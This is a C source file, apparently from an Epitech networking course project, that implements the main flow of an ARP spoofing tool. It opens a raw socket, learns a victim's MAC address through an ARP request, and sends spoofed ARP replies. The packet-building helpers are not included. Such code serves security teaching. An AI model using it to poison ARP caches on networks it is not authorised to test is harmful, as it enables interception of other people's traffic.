/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** lexer
*/

#include "arpspoof.h"

static int additionnal_params(data_t data)
{
    if (data.p_broadcast)
        return print_broadcast(data);
    else if (data.p_spoof)
        return print_spoof(data);
    return 0;
}

static int run_spoofing(data_t data)
{
    char *frame;
    unsigned char *targ_mac = convert_mac("ff:ff:ff:ff:ff:ff");
    unsigned char *victim_mac = NULL;
    int fd;

    if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
        return (display_error("Failed open socket"), FAILURE);
    frame = create_arp_packet(data, ARPOP_REQUEST, targ_mac);
    if (send_packet(data, fd, frame))
        return FAILURE;
    free(frame);
    if ((victim_mac = recv_packet(fd)) == NULL)
        return FAILURE;
    frame = create_arp_packet(data, ARPOP_REPLY, victim_mac);
    free(victim_mac);
    if (send_spoofed_packet(data, fd, frame))
        return FAILURE;
    free(frame);
    return EXIT_SUCCESS;
}

int lexer(data_t data)
{
    if (additionnal_params(data))
        return EXIT_SUCCESS;
    if (run_spoofing(data))
        return FAILURE;
    return EXIT_SUCCESS;
}